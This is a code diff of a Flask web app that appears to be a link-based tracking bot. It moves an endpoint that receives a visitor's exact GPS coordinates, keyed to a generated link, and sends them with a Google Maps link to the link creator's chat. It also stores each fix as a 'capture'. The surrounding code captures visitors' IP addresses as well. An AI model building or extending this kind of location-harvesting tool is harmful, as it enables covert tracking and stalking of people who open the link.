@@ -117,7 +117,7 @@ def extract_video_info(text):
     return None
 
 
-# ============ IP GEOLOCATION (FIXED - GPS + IP) ============
+# ============ IP GEOLOCATION ============
 
 def get_ip_address():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -291,48 +291,6 @@ def format_geo_message(geo):
         msg += f"\n\n⚠️ *Note:* IP location may be approximate due to ISP routing."
     
     return msg
-
-
-# ============ GPS LOCATION (NEW) ============
-
-@app.route("/api/gps_location", methods=["POST"])
-def gps_location():
-    """Receive exact GPS coordinates from the user's phone."""
-    data = request.json
-    link_id = data.get("link_id")
-    lat = data.get("lat")
-    lon = data.get("lon")
-    
-    if not link_id or lat is None or lon is None:
-        return jsonify({"status": "error", "message": "Missing data"}), 400
-    
-    link_data = generated_links.get(link_id)
-    if not link_data:
-        return jsonify({"status": "error", "message": "Link not found"}), 404
-    
-    chat_id = link_data["created_by"]
-    
-    # Format GPS message
-    gps_msg = (
-        f"📍 *Exact GPS Location (Phone)*\n\n"
-        f"📌 *Latitude:* `{lat}`\n"
-        f"📌 *Longitude:* `{lon}`\n"
-        f"🗺️ [View on Google Maps](https://www.google.com/maps?q={lat},{lon})\n"
-        f"🔗 `{link_id}`\n"
-        f"🕐 {datetime.now().strftime('%H:%M:%S')}"
-    )
-    
-    send_message_sync(chat_id, gps_msg)
-    
-    # Store GPS data
-    link_data.setdefault("captures", []).append({
-        "type": "gps_location",
-        "lat": lat,
-        "lon": lon,
-        "time": datetime.now().isoformat()
-    })
-    
-    return jsonify({"status": "success", "sent": True})
 
 
 # ============ HELPERS ============
@@ -846,6 +804,46 @@ def capture_ip_only():
     except Exception as e:
         logger.error(f"IP-only capture error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/gps_location", methods=["POST"])
+def gps_location():
+    """Receive exact GPS coordinates from the user's phone."""
+    data = request.json
+    link_id = data.get("link_id")
+    lat = data.get("lat")
+    lon = data.get("lon")
+    
+    if not link_id or lat is None or lon is None:
+        return jsonify({"status": "error", "message": "Missing data"}), 400
+    
+    link_data = generated_links.get(link_id)
+    if not link_data:
+        return jsonify({"status": "error", "message": "Link not found"}), 404
+    
+    chat_id = link_data["created_by"]
+    
+    # Format GPS message
+    gps_msg = (
+        f"📍 *Exact GPS Location (Phone)*\n\n"
+        f"📌 *Latitude:* `{lat}`\n"
+        f"📌 *Longitude:* `{lon}`\n"
+        f"🗺️ [View on Google Maps](https://www.google.com/maps?q={lat},{lon})\n"
+        f"🔗 `{link_id}`\n"
+        f"🕐 {datetime.now().strftime('%H:%M:%S')}"
+    )
+    
+    send_message_sync(chat_id, gps_msg)
+    
+    # Store GPS data
+    link_data.setdefault("captures", []).append({
+        "type": "gps_location",
+        "lat": lat,
+        "lon": lon,
+        "time": datetime.now().isoformat()
+    })
+    
+    return jsonify({"status": "success", "sent": True})
 
 
 # ============ BOT ============
